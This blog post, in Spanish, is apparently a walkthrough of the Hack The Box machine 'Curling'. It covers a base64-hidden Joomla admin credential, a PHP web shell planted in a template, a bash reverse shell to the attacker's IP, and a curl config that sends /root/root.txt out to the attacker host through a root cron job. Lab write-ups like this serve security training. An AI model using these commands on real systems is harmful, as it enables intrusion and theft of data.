---
layout: post
title: Hack The Box Curling Write-Up
date: 2024-11-18
categories: [Write-Ups, HackTheBox, Machine, Easy]
tags: [curl, cyberchef, joomla!, rce, pspy, cron, eJPT, IntroToDante, Easy, Web]
---
![Curling Logo](/assets/post_details/curling/curling_logo.png)
# Hack The Box: Curling Write-Up
La **maquina easy** [Curling](https://app.hackthebox.com/machines/160) de [Hack The Box](https://app.hackthebox.com/) 

## Enumeration
Realizamos la enumeración de puertos y de servicios en los que encontramos abiertos los puertos:
- 22 - SSH -> `OpenSSh 7.6p1`
- 80 - HTTP -> `Apache httpd 2.4.29`, el cual contiene el **CMS** **Joomla!**.
```bash
# Escaneo de todos los puertos abiertos
nmap -p- -sS -n --min-rate 5000 --open 10.10.10.150 -oN tcp_scan.txt

# Escaneo puertos especificos
nmap -p22,80 -Pn --min-rate 5000 -n -sCV --open 10.10.10.150 -oN full_scan.txt
```
![NMAP](/assets/post_details/curling/curling_nmap.png)
### HTTP(80) - Joomla!
Se trata de un blog, donde el usuario **Super User** ha agregado varios posts, en estos posts existen varias palabras entre comillas o que pueden ser interesantes como `pebble`, `Floris`, `curl`, `curling2018`.
![WebPage](/assets/post_details/curling/curling_webpage.png)

Realizando un `Ctrl + O` o analizando el codigo, avistamos un comentario sobre un posible archivo en el sistema **secret.txt**.
![Secret Code](/assets/post_details/curling/curling_secret.png)

Este archivo existe en la raiz de la aplicación web, contiene un string encriptado con algun tipo de metodo de encriptación.
![Secret Note](/assets/post_details/curling/curling_show_secret.png)

Probramos a decodificarlo con **base64** y con exito obtenemos un string parecido a uno de los del texto, aunque este tiene una `!` por lo que podria tratarse de una credencial.
![base64](/assets/post_details/curling/curling_base64.png)

Una vez tenemos lo que puede ser la credencial debemos de obtener el nombre de usuario, si analizamos este post acaba dejando un nombre, normalmente esto se hace para dejar quien ha escrito el texto. En este caso el string es `Floris`, aunque en el login lo probaremos todo en lowercase `floris`.
![Username Joomla](/assets/post_details/curling/curling_username_joomla.png)

Mediante la ruta `administrator`, el cual es el acceso de administración del **CMS Joomla!**, en el que introducimos las credenciales y con exito obtenemos acceso al panel.
![Login Admin](/assets/post_details/curling/curling_login_admin.png)
## FootHold
### Template RCE Joomla!
Existen varias maneras de tomar el control desde **Joomla!** una de ellas es la [siguiente](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla):
- Clicar en `Templates`, abajo a la izquierda en el menu de `Configuration`.
- Clicar en una nombre de template, por ejemplo `protostar`, debajo de la cabecera de `Templates`, esto nos llevara a pagina de modificación de templates
- Finalmente deberemos de editar un archivo del template, en nuestro caso editamos el `error.php` agregandole `system($_GET['cmd'])`.
![RCE](/assets/post_details/curling/curling_rce.png)

Una vez tenemos realizada la modificación del archivo **php**, mediante **curl** mandamos una petición con la flag `?cmd=`, y el comando que queramos que se ejecute a nivel de sistema.
![Curl RCE](/assets/post_details/curling/curling_curl_rce.png)

Para conseguir acceso al sistema nos levantamos un **listener** por el puerto **443** en mi caso e introducimos un **reverse shell** de bash apuntando a nuestro servidor y conseguirmos acceso al sistema como **www-data**:
```bash
curl -s "http://10.10.10.150/templates/protostar/error.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.4/443 0>%261"
```
![Get www-data](/assets/post_details/curling/curling_get_www-data.png)
## PrivEsc
### www-data -> floris
Una vez hecho realizamos un **Tratamiento de TTY** para así poder trabajar de una mejor manera.

Empezamos a enumerar el sistema buscando la credencial del usuario **floris** para asi poder escalar privilegio, encontramos un archivo en el home del usuario `floris`, al cual tenemos permisos de lectura, aunque es un archivo en binario por lo que no lo podemos leer. 
![Password Backup](/assets/post_details/curling/curling_password_backup.png)

Aunque con [CyberChef](https://cyberchef.org) podemos realizar un **magic decrypt** para asi ver el contenido del archivo.
En este caso el archivo binario, contiene un archivo en txt llamado **password.txt** el cual contiene una credencial.
![CyberChef](/assets/post_details/curling/curling_cyberchef.png)

Esta credencial nos sirve para escalar privilegio al usuario **floris**.
![Get User](/assets/post_details/curling/curling_get_user.png)
### floris -> get_flag
Utilizamos [pspy](https://github.com/DominicBreuker/pspy) para la enumeración de tareas cron en el sistema, para esto nos descargamos la herramienta **pspy64**, y la transferimos con la herramienta **scp**, comunicación a traves del protocolo **ssh**.
```bash
mv /home/ant0/Downloads/pspy64 .
chmod +x pspy64
scp pspy64 floris@10.10.10.150:/home/floris
```

Podemos que el usuario **root** esta realizando algunas tareas cada cierto tiempo, en este caso copia el contenido del archivo `/root/default.txt` a `/home/floris/admin-area/input` el cual contiene `url = 127.0.0.1`.

El comando con **curl** realiza lo siguiente:
- La opción **-K** le indica a curl que lea un archivo de configuración en la ruta `/home/floris/admin-area/input`. 
  Este archivo puede contener múltiples opciones de configuración para curl, como la URL del servidor, encabezados personalizados.
- Con `-o /home/floris/admin-area/report` el contenido resultante de la solicitud HTTP será guardado en `/home/floris/admin-area/report`.
![Cron Tasks](/assets/post_details/curling/curling_show_cron.png)

Lo que podemos realizar para capturar la flag es de apuntar a nuestra maquina con la propiedad **url** y con **data** hacia la flag: 
```bash
url = "http://10.10.14.4"
data = @/root/root.txt
```

Nos abrimos un listener en nuestra maquina por el puerto 80 y cuando la tarea se vuelva a ejecutar nos mostrara la flag:
![Get Flag](/assets/post_details/curling/curling_get_system_flag.png)
